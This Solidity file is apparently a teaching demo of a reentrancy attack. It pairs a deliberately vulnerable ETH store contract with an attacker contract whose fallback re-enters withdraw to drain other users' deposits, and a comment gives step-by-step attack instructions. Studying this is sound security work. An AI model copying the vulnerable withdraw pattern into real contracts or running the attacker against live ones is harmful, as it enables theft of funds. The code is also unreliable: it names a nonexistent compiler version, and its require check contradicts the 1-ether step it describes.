// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.7.24;

/**
 * Vulnerability
 * Let's say that contract A calls Contract B
 * Reentrancy exploit allows B to to call into A before A fnishes execution.
 *
 *
 * EtherStroe is a contract where you can deposite and withdraw ETH.
 * This contract is vulnerable to re-entrancy attack.
 * Let's see why
 *
 *  1)Deploy Etherstore
 *  2)Deposit 1 ether each from Account1(alice) and Account 2(Bob) into Ethstore
 *  3)Deploy attack with address of etherstore
 *  4)Call Attack.attact sending 1 ether (using Account 3(EVE)).
 *     You will get 3 ethers back (2 Ether stolen from Alice and Bob,plus 1 ether sent from this contract)
 *
 * What happened?
 * Attack was able to call Etherstore.withdraw multiple times before EtherStore.withdraw finished executing.
 *
 * Here is how the function were called
 * -Attact.attact
 * -Etherstrore.deposit
 * -Etherstore.withdraw
 * -Attact fallback(receive 1 Ether)
 * -etherstore.withdraw
 * -Attact fallback(receive 1 Ether)
 * -etherstore.withdraw
 * -Attact fallback(receive 1 Ether)
 */
contract EthStore {
    mapping(address => uint256) public Balance;

    function deposit() public payable {
        Balance[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = Balance[msg.sender];
        require(bal > 0);
        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ehter");

        Balance[msg.sender] = 0;
    }

    function getbalnce() public view returns (uint256) {
        return address(this).balance;
    }
}

contract attact {
    EthStore public etherStore;
    uint256 public constant Aount = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EthStore(_etherStoreAddress);
    }

    //Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= Aount) {
            etherStore.withdraw();
        }
    }

    function Attact() external payable {
        require(msg.value > Aount);
        etherStore.deposit{value: Aount}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
